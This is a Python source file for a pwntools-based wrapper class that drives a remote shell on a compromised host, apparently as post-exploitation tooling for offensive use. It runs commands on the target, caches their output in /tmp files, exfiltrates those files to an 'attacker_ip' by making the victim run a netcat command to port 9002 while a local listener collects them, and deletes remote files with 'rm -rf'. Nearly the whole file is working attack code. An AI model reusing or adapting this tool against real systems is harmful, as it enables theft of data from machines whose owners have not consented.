import hashlib
import pwn

'''
pwnlib.tubes.sock wrapper
'''
class PwnlibSocketWrapper:
    def __init__(self, client, expected_prompt, attacker_ip):
        self.client = client
        self.expected_prompt = expected_prompt
        self.attacker_ip = attacker_ip
        self.timeout = 1
        self.encoding = 'utf-8'
        self.remote_output_folder = '/tmp/'
        self.netcat_file_transfer_port = 9002

    def ignore_until_prompt(self):
        self.client.recvuntil(self.expected_prompt)

    def send_command_read_output(self, command_bytes, single_line_output=False):
        self.ignore_until_prompt()
        self.client.sendline(command_bytes)
        self.client.recvuntil(command_bytes + b'\n')

        output = ''
        while True:
            output_line = self.client.recvuntil(b'\n', timeout=self.timeout).decode(self.encoding)
            output += output_line

            if not output_line or single_line_output:
                break

        return output.strip()

    def send_command_temporary_file(self, command_bytes):
        hash_str = hashlib.md5(command_bytes).hexdigest()
        output_remote_temporary_file = self.remote_output_folder + hash_str

        if self.remote_file_exists(output_remote_temporary_file):
            return output_remote_temporary_file

        command_bytes = f'{command_bytes.decode(self.encoding)} > {output_remote_temporary_file}'.encode()
        self.client.sendline(command_bytes)
        return output_remote_temporary_file

    def download_remote_file(self, remote_path):
        download_command = f'nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
        self.client.sendline(download_command)

        downloaded_output = None
        with pwn.listen(self.netcat_file_transfer_port).wait_for_connection() as client:
            downloaded_output = client.recvall().strip()

        return downloaded_output.decode(self.encoding)

    def delete_remote_file(self, remote_path):
        remove_command = f'rm -rf {remote_path}'.encode()
        self.client.sendline(remove_command)

    def remote_file_exists(self, remote_path):
        file_exists_command = f'file {remote_path}'.encode()
        output = self.send_command_read_output(file_exists_command, single_line_output=True)
        return 'No such file or directory' not in output and ': empty' not in output

    def send_command_read_cached_temporary_file(self, command_bytes):
        remote_temporary_file = self.send_command_temporary_file(command_bytes)
        output = self.download_remote_file(remote_temporary_file)
        return output